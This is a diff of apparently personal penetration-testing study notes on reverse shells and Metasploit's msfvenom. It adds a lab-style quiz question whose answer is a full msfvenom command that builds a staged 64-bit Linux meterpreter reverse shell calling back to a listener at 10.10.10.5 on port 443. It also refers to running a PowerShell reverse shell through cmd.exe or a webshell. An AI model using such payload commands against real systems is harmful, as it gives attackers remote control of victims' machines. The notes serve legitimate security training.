@@ -226,7 +226,7 @@ When targeting a modern version of Windows Server, we can use the following Powe
 In order to use this, we need to replace `<IP>` and `<port>` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
 ![[Pasted image 20240818163651.png]]
 
-## **msfvenom**
+## **Metasploit - msfvenom**
 Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`).
 
 The standard syntax for msfvenom is as follows:
@@ -295,3 +295,9 @@ Aside from the `msfconsole` man page, the other important thing to note when w
 	msfvenom --list formats
 	
 ![[Pasted image 20240818170339.png]]
+
+Q) What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`.
+
+	msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
+	
+## **Metasploit - multi/handler**
